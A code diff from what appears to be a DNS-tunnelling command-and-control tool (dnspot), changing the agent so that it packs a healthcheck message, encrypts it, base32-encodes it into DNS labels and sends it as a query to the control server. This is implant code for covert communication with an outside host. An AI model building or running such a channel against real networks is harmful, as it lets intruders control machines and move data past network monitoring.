@@ -5,7 +5,11 @@ import (
 	"encoding/base32"
 	"fmt"
 	"strings"
+	"time"
 
+	"github.com/lunixbochs/struc"
+
+	"github.com/mosajjal/dnspot/c2"
 	"github.com/mosajjal/dnspot/cryptography"
 	"github.com/spf13/cobra"
 
@@ -66,21 +70,33 @@ func RunAgent(cmd *cobra.Command, args []string) {
 	private, _ := cryptography.PrivateKeyFromString(privateKey)
 	public, _ := cryptography.PublicKeyFromString(serverPublicKey)
 
-	msg := "hello lets take ssa look atchars22hello lets lets take ssa look atcha"
-	// msg := "hello"
-	encrypted, err := cryptography.Encrypt(public, private, []byte(msg))
+	// msg := "hello lets take ssa look atchars22hello lets lets take ssa look atcha"
+	msg := c2.MessagePacket{
+		TimeStamp:      uint32(time.Now().Unix()),
+		MessageType:    c2.MessageHealthcheck,
+		EnabledService: c2.ServiceNone,
+		IsMultiPart:    false,
+		PartID:         0,
+		ParentPartID:   0,
+	}
+	copy(msg.Payload[:], "hello")
+	var buf bytes.Buffer
+	struc.Pack(&buf, &msg)
+	encrypted, err := cryptography.Encrypt(public, private, buf.Bytes())
 	if err != nil {
 		panic(err.Error())
 	}
 
 	s := base32.StdEncoding.EncodeToString(encrypted)
-	glg.Infof("encrypted %s %d\n", s, len(encrypted))
+	s = strings.ReplaceAll(s, "=", "")
 
 	Q := insertNth(s, 63) + dnsSuffix
 	if len(Q) > 255 {
-		panic("too long")
+		glg.Warnf("query is too long %d\n", len(Q))
+	} else {
+		q := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
+		glg.Infof("query %s\n", q.String())
+		performExternalQuery(q, serverAddress)
 	}
-	q := dns.Question{Name: Q, Qtype: dns.TypeA, Qclass: dns.ClassINET}
-	fmt.Printf("%v", q)
-	performExternalQuery(q, serverAddress)
+
 }
